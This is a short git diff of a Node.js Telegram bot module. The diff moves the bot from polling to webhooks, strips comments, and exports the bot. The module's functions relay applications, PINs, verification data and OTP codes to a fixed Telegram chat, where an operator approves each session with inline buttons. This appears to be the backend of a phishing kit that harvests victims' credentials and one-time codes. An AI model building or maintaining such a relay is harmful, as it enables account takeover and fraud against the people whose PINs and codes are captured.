@@ -6,7 +6,8 @@ const db = require('./db');
 const token = process.env.TELEGRAM_BOT_TOKEN;
 const chatId = process.env.TELEGRAM_CHAT_ID;
 
-const bot = new TelegramBot(token, { polling: true });
+// IMPORTANT: polling is false because we are using webhooks on Render
+const bot = new TelegramBot(token, { polling: false });
 
 // 1. Send Initial Application
 async function sendApplicationToTelegram(sessionId, data) {
@@ -144,18 +145,21 @@ bot.on('callback_query', async (query) => {
         db.updateStatus(sessionId, statusUpdate);
         await bot.answerCallbackQuery(query.id, { text: replyText });
 
-        // Remove the inline buttons from the original message so they can't be clicked again
         try {
             await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
-        } catch (e) {
-            // Ignore if markup removal fails
-        }
+        } catch (e) {}
 
-        // Send a brand new message below keeping history intact, matching your screenshot style
         await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
     } else {
         await bot.answerCallbackQuery(query.id, { text: "Error: Session expired." });
     }
 });
 
-module.exports = { sendApplicationToTelegram, sendPinToTelegram, sendVerificationToTelegram, sendOtpToTelegram };
+// Export the bot so server.js can use it for webhooks
+module.exports = { 
+    bot, 
+    sendApplicationToTelegram, 
+    sendPinToTelegram, 
+    sendVerificationToTelegram, 
+    sendOtpToTelegram 
+};
